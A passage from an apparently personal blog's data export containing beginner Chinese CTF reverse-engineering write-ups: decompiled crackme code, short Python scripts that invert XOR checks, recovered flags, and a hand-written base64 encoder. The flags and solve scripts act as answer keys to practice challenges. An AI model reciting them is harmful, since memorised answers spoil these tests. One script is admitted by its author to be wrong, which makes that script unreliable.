96wRZDv1dSK/f1vz+mUeUyUlFY0iMjfw5eBXWZppNZi3ZtJcq5kllM2ACVFcxQWI3azM3ArOcqjosoiPjNoDYgKh7w4k2Cd0kLYEHscz/njtJ1KEcwLtqs4nJ+gB2r4V9g03YgvY5E8JJtfJMKdaTedjtvEuif8FNlCK9DMnL1iLpWptJbdfO83Y7Y46XCqjZFBI5o9Qtb78nLhMEM5/YTaNOM/wE/oJl5HI/i1X6kW3PKCsVubRkOkc2xawl6NYdLETjLvmrGhhI&apos;a = 138429774382724799266162638867586769792748493609302140496533867008095173455879947894779596310639574974753192434052788523153034589364467968354251594963074151184337695885797721664543377136576728391441971163150867881230659356864392306243566560400813331657921013491282868612767612765572674016169587707802180184907Lb = 166973306488837616386657525560867472072892600582336170876582087259745204609621953127155704341986656998388476384268944991674622137321564169015892277394676111821625785660520124854949115848029992901570017003426516060587542151508457828993393269285811192061921777841414081024007246548176106270807755753959299347499Lc = 139406975904616010993781070968929386959137770161716276206009304788138064464003872600873092175794194742278065731836036319691820923110824297438873852431436552084682500678960815829913952504299121961851611486307770895268480972697776808108762998982519628673363727353417882436601914441385329576073198101416778820619Ld = 120247815040203971878156401336064195859617475109255488973983177090503841094270099798091750950310387020985631462241773194856928204176366565203099326711551950860726971729471331094591029476222036323301387584932169743858328653144427714133805588252752063520123349229781762269259290641902996030408389845608487018053Le = 104267926052681232399022097693567945566792104266393042997592419084595590842792587289837162127972340402399483206179123720857893336658554734721858861632513815134558092263747423069663471743032485002524258053046479965386191422139115548526476836214275044776929064607168983831792995196973781849976905066967868513707LF = (a,b,c,d,e)m = 8804961678093749244362737710317041066205860704668932527558424153061050650933657852195829452594083176433024286784373401822915616916582813941258471733233011Lg = 67051725181167609293818569777421162357707866659797065037224862389521658445401Lz = []for i, f in enumerate(F): n = pow(f, m, g) this_is = &apos;Y-Combinator&apos; l = (lambda f: (lambda x: x(x))(lambda y: f(lambda *args: y(y)(*args))))(lambda f: lambda x: (1 if x &lt; 2 else f(x - 1) * x % n))(g % 27777) c = raw_input(&apos;Channenge #%d:&apos; % i) if int(c) != l: print &apos;Wrong~&apos; exit() z.append(l)z.sort()gg = &apos;(flaSg\\&apos;7 \\\\h#GiQwt~66\\x0csxCN]4sT&#123;? Zx YCf6S&gt;|~`\\x0c$/&#125;\\&apos;\\r:4DjJFvm]([sP%FMY&quot;@=YS;CQ7T#zx42#$S_j0\\\\Lu^N31=r\\x0b\\t\\tjVhhb_KM$|6]\\nl!:V\\rx8P[0m ;ho_\\rR(0/~9HgE8!ec*AsGd[e|2&amp;h!&#125;GLGt\\&apos;=$\\x0cbKFMnbez-q\\\\`I~];@$y#bj9K0xmI2#8 sl^gBNL@fUL\\x0b\\\\9Ohf]c&gt;Vj/&gt;rnWXgLP#&lt;+4$BG@,\\&apos;n a_7C:-&#125;f(WO8Y\\x0c2|(nTP!\\&apos;\\\\&gt;^\\&apos;&#125;-7+AwBV!w7KUq4Qpg\\tf.&#125;Z7_!m+ypy=`3#\\\\=?9B4=?^&#125;&amp;\\&apos;~ Z@OH8\\n0=6\\x0b\\tv\\nl!G\\&apos;y4dQW5!~g~I*f&quot;rz1&#123;qQH&#123;G9\\x0c\\&apos;b\\x0cp\\x0bdu!2/\\\\@i4eG&quot;If0A&#123;-)N=6GMC&lt;U5/ds\\rG&amp;z&gt;P1\\nsq=5&gt;dFZUWtjv\\tX~^?9?Irwx\\\\5A!32N\\x0bcVkx!f)sVY Men\\x0c\\&apos;ujN&lt;&quot;LJ\\x0c5R4&quot;\\\\\\\\XPVA\\&apos;m$~tj)Br&#125;C&#125;&amp;kX2&lt;|\\np3XtaHB.P\\&apos;(E 4$dm!uDyC%u [&quot;x[VYw=1aDJ (8V/a!J?`_r:n7J88!a25AZ]#,ab?&#123;%e\\x0b]wN_&#125;*Q:mh&gt;@]u\\t&amp;6:Z*Fmr?U`cOHbAf7s@&amp;5~L ,\\tQ18 -Hg q2nz%\\x0ccUm=dz&amp;h1(ozoZ)mrA=`HKo\\n\\&apos;rXm&#125;Z-l3]WgN\\\\NW&lt;&#123;o=)[V(&#123;7&lt;N1.-A8S&quot;=;3sderb\\tOZ$K\\r0o/5\\x0bMc76EGCWJ3IQpr7!QhbgzX8uGe3&lt;w-g\\&apos;/j\\&apos;\\tM4|9l?i&amp;tm_\\n57X0B2rOpuB@H@%L_\\r)&amp;/q=LZa(%&#125;&quot;&quot;#if#Kq74xK?`jGFOn&quot;8&amp;^3Q-\\r#]E$=!b^In0:$4VKPXP0UK=IK)Y\\rstOT40=?DyHor8j7O\\\\r/~ncJ5];cCT)c?OS0EM5m#V(-%&quot;Tu:!UsE],0Dp s@HErS]J&#123;%oH54B&amp;(zE.(@5#2k\\tJnNlnUEij\\\\.q/3HBpJNk*X(k5;DlqK\\&apos;\\&apos;fX\\r&#125;EBk_7\\x0b:&gt;8~\\t+M@WJx.PO(&#123;/U&#125;1&#125;#TqjreG\\nN&#123;\\rX&gt;4EsJr0Pn\\\\Z\\\\aL/-U&lt;&lt;&#123;,Q;j\\tF=7f\\&apos;)+wH:p&#123;G=_.s\\\\t-\\x0bI\\x0c*y\\t1P:Y|/2xE&lt;uo]~$&gt;5k]FW+&gt;fR&lt;QA&quot;(Fj[LL(hzfQo#PJ;:*0kB~3]9uL[o.xue:VQ\\t;9-Tu\\tq|mzzhV_okP\\t,d\\rQ`]5Gf\\x0c#gXB\\x0cAH|)NI|K=KW-&amp;p-&lt;b&quot;3e.rO\\x0cuK=\\x0c^\\r+MuLxCJ`UKaD\\x0bBH&amp;n+YVajZ(U7pwWtto3T10VLHwSJ\\rK\\t&#125;\\&apos;F$l1:b2Bd\\na=#t0iq&#125;#!&#123;1_)w$&#125;&lt;Dp(borC\\&apos;\\t?r6;,+k;a(Q3@B?RCWYEDrjZe![x=n_%S]rl&#123;&amp;fLr*mgCD;92/nNsaxKy/;\\nr]sPK=`+YP&gt;MmfB\\n8O4/&quot;&#125;nE7r*=41f2\\t37&gt;K\\&apos;s$wpl;qS[`qzu\\x0b\\t\\nuaU|b,C`4&amp; dRN~]7DnuTb2FhNHV!#Z2Hho\\x0b[%.&#123;O\\t$q0\\x0ch_@?w@b8[I^&#123;JL|O8]i8&#123;p)A.w)14qK3JoyF%licZ~ga\\rW[L:W\\rtIvfWJjZUOvB\\rS.Beav3!-@bw|PexJ Pcw1\\ry6!63B&#125;]J])6fak/3r]W\\tMeXt[uc(1_U lys&#123;a1X\\r%)[wwP3rhgNW&#123;*d~_E%Q2htCt5ha@l0^0=\\x0bwT\\ni4/V;_\\nM1rb?w~Q)Dli4u\\n`&#125;1+D8&quot;\\t`@V~$9l$Uy**VnI (@Ga0&lt;RxfmoNgJTtE-aLH\\rE5fMy7rk$)V\\rL2Fv/AivOa&quot;\\nuX|70Xrw^D]%i%JyT\\x0cc%cwZ/Wbp=IiY;/@nFEe&gt;3=tM;K*`fReGoc5V/Ri?nXZ-RW)\\&apos;\\t&lt;\\x0cV&gt;@X@-Ei4%sO%&#125;,B_pjc`s&quot;@oKCmdgDhjUZT@?mb\\&apos;?Q:F\\x0bLJkPgjaFAc=rbrjAz$Zz\\x0cq0GU!&quot;)xFOEF(x!3M\\t:l83|&#125;&#125;HgGJJ#eT/I\\x0b[|lK_n+;Wi/N^B4LzL.a(gVWq,zO6\\&apos;S|tb&gt;RX` ca*CO&lt;w\\x0ci =wc1,M~\\x0bc`FYEs\\r)&#123;+Ll8[I9-88m\\t\\\\iK/\\\\hno-C[vX*3Hx:%:K\\rt\\x0cW!tj\\&apos;SOhqxP|k7cw Hm?I@?P\\&apos;HmapG7$0#T(Auz]sjmd#\\rFP/&#125;53@-Kvmi(d%dZKLZ2LK\\&apos;e_E\\x0bQmR 5/(irq4-EUyp&lt;hB?[\\tnU:p*xuzASM&apos;print &apos;&apos;.join((gg[(lambda f: (lambda x: x(x))(lambda y: f(lambda *args: y(y)(*args))))(lambda f: lambda n: (1 if n &lt; 3 else f(n - 1) + f(n - 2)))(i + 2)] for i in range(16))) % &apos;&apos;.join((data[pow((__import__(&apos;fractions&apos;).gcd(z[i % 5], z[(i + 1) % 5]) * 2 + 1) * g, F[i % 5] * (i * 2 + 1), len(data))] for i in range(32))) 先运行一波： 123sH1rkEr:desktop macbook$ python 1.pyChannenge #0:111Wrong~ 观察到print ‘Wrong~’ 上面的if int(c) != l 可能就是判断条件，把!=改成==尝试一波 1234567sH1rkEr:desktop macbook$ python 1.pyChannenge #0:1Channenge #1:1Channenge #2:122313Channenge #3:123Channenge #4:13flag is FLAG&#123;VBXDVV4jkVVS4hVVj7NVV1heVVX1jVVh&#125; flag get 话说只能做做这种简单的题目了QAQ","categories":[],"tags":[]},{"title":"sus-helloworld","slug":"sus-helloworld","date":"2018-09-22T16:19:46.000Z","updated":"2018-09-22T16:28:18.670Z","comments":true,"path":"2018/09/23/sus-helloworld/","link":"","permalink":"http://yoursite.com/2018/09/23/sus-helloworld/","excerpt":"","text":"题目地址 ida启动 main函数: 123456789101112131415161718192021*(_DWORD *)flag = 0xC881E8F1;*(_DWORD *)&amp;flag[4] = 0xCECF81D2;*(_DWORD *)&amp;flag[8] = 0x81C081D5;*(_DWORD *)&amp;flag[12] = 0xC8D5C0D3;*(_DWORD *)&amp;flag[16] = 0xCDC0CFCE;*(_DWORD *)&amp;flag[20] = 0xCCD4CF81;*(_DWORD *)&amp;flag[24] = 0x8FD3C4C3;flag[28] = 0;printf(&quot;What is magic number? &quot;);__isoc99_scanf(&quot;%d&quot;, &amp;n);if ( n == 0x12B9B0A1 )&#123; for ( i = 0; flag[i]; ++i ) flag[i] ^= n; printf(&quot;Flag is FLAG&#123;%s&#125;\\n&quot;, flag);&#125;else&#123; puts(&quot;Try Hard.&quot;);&#125;return 0; 如果输入的n为0x12b9b0a1，flag[i]^=n 通过汇编命令可以发现此处n取一个byte，也就是0xa1 逆运算脚本如下： 123456789101112flag=[0xf1,0xe8,0x81,0xc8,0xd2,0x81,0xcf,0xce,0xd5,0x81,0xc0,0x81,0xd3,0xc0,0xd5,0xc8,0xce,0xcf,0xc0,0xcd,0x81,0xcf,0xd4,0xcc,0xc3,0xc4,0xd3,0x8f]s=&apos;&apos;for i in flag: i^=0xa1 s+=chr(i)print s flag get 因为不会啥操作，所以flag list只能手打了……","categories":[],"tags":[]},{"title":"sus-bitx","slug":"bitx","date":"2018-09-22T11:33:03.000Z","updated":"2018-09-22T16:19:09.808Z","comments":true,"path":"2018/09/22/bitx/","link":"","permalink":"http://yoursite.com/2018/09/22/bitx/","excerpt":"","text":"题目地址 拖进ida，主函数一目了然，直接进入验证函数： 123456for ( i = 0; *(_BYTE *)(i + a1) &amp;&amp; *(_BYTE *)(i + 0x804A040); ++i )&#123; if ( *(_BYTE *)(i + a1) + 9 != ((unsigned __int8)((*(_BYTE *)(i + 0x804A040) &amp; 0xAA) &gt;&gt; 1) | (unsigned __int8)(2 * (*(_BYTE *)(i + 0x804A040) &amp; 0x55))) ) return 0;&#125;return 1; 将输入与0x804a040处的值经过一系列运算后比较若不相等则gg，直接写脚本： 123456final=[0x8F,0x0AA,0x85,0x0A0,0x48,0x0AC,0x40,0x95,0x0B6,0x16,0x0BE,0x40,0x0B4,0x16,0x97,0x0B1,0x0BE,0x0BC,0x16,0x0B1,0x0BC,0x16,0x9D,0x95,0x0BC,0x41,0x16,0x36,0x42,0x95,0x95,0x16,0x40,0x0B1,0x0BE,0x0B2,0x16,0x36,0x42,0x3D,0x3D,0x49]flag=finalfor i in range(len(final)): flag[i]=((final[i]&amp;0xaa)&gt;&gt;1|2*(final[i]&amp;0x55) )-9out=&apos;&apos;.join([chr(i) for i in flag])print out flag get","categories":[],"tags":[]},{"title":"base64","slug":"base64","date":"2018-09-22T06:58:58.000Z","updated":"2018-09-22T07:09:04.289Z","comments":true,"path":"2018/09/22/base64/","link":"","permalink":"http://yoursite.com/2018/09/22/base64/","excerpt":"","text":"百度了一会base64，在吾爱破解上发现了一篇讲解很详细的文章，于是尝试自己实现base64加密 12345678910111213141516171819202122232425262728293031323334353637383940letters=[&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;,&apos;E&apos;,&apos;F&apos;,&apos;G&apos;,&apos;H&apos;,&apos;I&apos;,&apos;J&apos;,&apos;K&apos;,&apos;L&apos;,&apos;M&apos;,&apos;N&apos;,&apos;O&apos;,&apos;P&apos;,&apos;Q&apos;,&apos;R&apos;,&apos;S&apos;,&apos;T&apos;,&apos;U&apos;,&apos;V&apos;,&apos;W&apos;,&apos;X&apos;,&apos;Y&apos;,&apos;Z&apos;,&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;,&apos;i&apos;,&apos;j&apos;,&apos;k&apos;,&apos;l&apos;,&apos;m&apos;,&apos;n&apos;,&apos;o&apos;,&apos;p&apos;,&apos;q&apos;,&apos;r&apos;,&apos;s&apos;,&apos;t&apos;,&apos;u&apos;,&apos;v&apos;,&apos;w&apos;,&apos;x&apos;,&apos;y&apos;,&apos;z&apos;,&apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;,&apos;+&apos;, &apos;/&apos;]def encode(str_input): str_output=&apos;&apos; list_input=[&apos;&#123;:0&gt;8&#125;&apos;.format(str(bin(ord(str_input[i]))).replace(&apos;0b&apos;, &apos;&apos;)) for i in range(len(str_input))] compensate=0 while list_input: list_temp=list_input[:3] while len(list_temp)%3: compensate+=1 list_temp.append(&apos;0&apos;*8) str_temp=&apos;&apos;.join(list_temp) list_str_temp=[str_temp[i:i+6] for i in [0,6,12,18]] list_str_temp=[int(i,2) for i in list_str_temp] str_output+=&apos;&apos;.join(letters[i] for i in list_str_temp) list_input=list_input[3:] str_output+=&apos;=&apos;*compensate return str_outputdef decode(str_input): str_output=&apos;&apos; list_input=[&apos;&#123;:0&gt;6&#125;&apos;.format(str(bin(letters.index(i))).replace(&apos;0b&apos;, &apos;&apos;))for i in str_input if i != &apos;=&apos;] compensate=0 for i in str_input: if i == &apos;=&apos;: compensate+=1 while list_input: list_temp=list_input[:4] str_temp=&apos;&apos;.join(list_temp) while len(str_temp)%8: str_temp=str_temp[0:-1*2*compensate] list_str_temp=[str_temp[i:i+8] for i in [0,8,16]] list_str_temp=[int(i,2) for i in list_str_temp] str_output+=&apos;&apos;.join([chr(i)for i in list_str_temp]) list_input=list_input[4:] return str_outputs=&quot;sadadsadaddasdadas&quot;d=&apos;c2FkYWRzYWRhZGRhc2RhZGFz&apos;print encode(s)print decode(d) 运行： 123sH1rkEr:desktop macbook$ python base64.pyc2FkYWRzYWRhZGRhc2RhZGFzsadadsadaddasdadas 终于是成功了，编写过程中由于字符串和list的问题总是出错，还是要多看看python","categories":[],"tags":[]},{"title":"acdES","slug":"acdES","date":"2018-09-22T01:21:17.000Z","updated":"2018-10-08T14:03:04.628Z","comments":true,"path":"2018/09/22/acdES/","link":"","permalink":"http://yoursite.com/2018/09/22/acdES/","excerpt":"","text":"Meizijiu字符串每位异或得到的值作为种子值 v7=rand()+(v7&lt;&lt;8)进行8次 输入text最多为96位 补0补到长度为8n v7处理后作为下标 再循环处理取值输出 n如果不为3的倍数，则补（3-n%3）个”=”","categories":[],"tags":[]},{"title":"cgctf-480小时精通c++","slug":"480小时","date":"2018-09-20T16:52:52.000Z","updated":"2018-09-22T01:20:58.359Z","comments":true,"path":"2018/09/21/480小时/","link":"","permalink":"http://yoursite.com/2018/09/21/480小时/","excerpt":"","text":"听了大佬的话先来搭个blog，虽然啥也不会，但是可以对着教程慢慢搭，不管怎样能看见网页就行了先…… 题目来自于cgctf平台，之前一直没做出来，光是名字就让我望而却步…… ida启动！main函数伪代码如下： 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp)&#123; signed int i; // [rsp+Ch] [rbp-54h] __int64 v5; // [rsp+10h] [rbp-50h] __int64 v6; // [rsp+18h] [rbp-48h] __int64 v7; // [rsp+20h] [rbp-40h] __int64 v8; // [rsp+28h] [rbp-38h] int v9; // [rsp+30h] [rbp-30h] char v10; // [rsp+34h] [rbp-2Ch] unsigned __int64 v11; // [rsp+58h] [rbp-8h] v11 = __readfsqword(0x28u); v5 = 7652827924304847970LL; v6 = 6588269719570178159LL; v7 = 0615273543157435660505LL; v8 = 4932672475662219355LL; v9 = 2099869557; v10 = 0; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((__int64)&amp;std::cout, (__int64)&quot;The Encrypted Flag is: &quot;); for ( i = 0; i &lt;= 35; ++i ) printf(&quot;%02x&quot;, *((unsigned __int8 *)&amp;v5 + i)); std::ostream::operator&lt;&lt;((__int64)&amp;std::cout, (__int64)std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); return 0;&#125; 很容易发现输出了加密后的flag，也就是v5-v9中的值，按r键转换成字符型，得加密flag:bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q{_tDuw)} 进入汇编界面发现输出”The Encrypted Flag is: “前被nop了一段，应该就是加密函数。 左侧函数列表中有480个名为_X1C_CG_EncryptFunction的函数，实现output[i]^=string[i%len(string)]^i，区别就是这480个函数中的string是从“001001001”到“480480480”。所以可以知道flag经过了这480个函数的加密后，就变成了bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q{_tDuw)}。 逆运算脚本如下： 1234567891011121314#!/usr/bin/env pythonkey=[]for i in range(1,481): n=str(i) key.append(n.zfill(3)*3)final=&quot;bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q&#123;_tDuw)&#125;&quot;flag=finalfor i in range(479,-1,-1): a=key[i] for j in range(35,-1,-1): s=ord(flag[j]) s^=ord(a[j%9])^j flag=flag.replace(flag[j],chr(s),1)print flag 于是得到了flag 可能由于并不会替换字符串中特定下标处的值，所以并没有得到flag……向大佬求救尚未得到回复…… 两小时后原因没错，通过百度了一会python中字符串替换的问题，找到了正确的替换方式： 12345678910111213141516#!/usr/bin/env pythonkey=[]for i in range(1,481): n=str(i) key.append(n.zfill(3)*3)final=&quot;bdacsN4jo`q_g&lt;n[Eaw|3vWc[x1q&#123;_tDuw)&#125;&quot;flag=finalflag1=list(flag)for i in range(479,-1,-1): a=key[i] for j in range(36): s=ord(flag1[j]) s^=ord(a[j%9])^j flag1[j]=chr(s)flag=&apos;&apos;.join(flag1)print flag flag get！ 通过大佬的指点终于是完成了这一道简单题，明明知道了怎么去逆运算，结果因为python不会用的原因忙了这么久……要学的太多 明天目标逆acdES","categories":[],"tags":[]}]}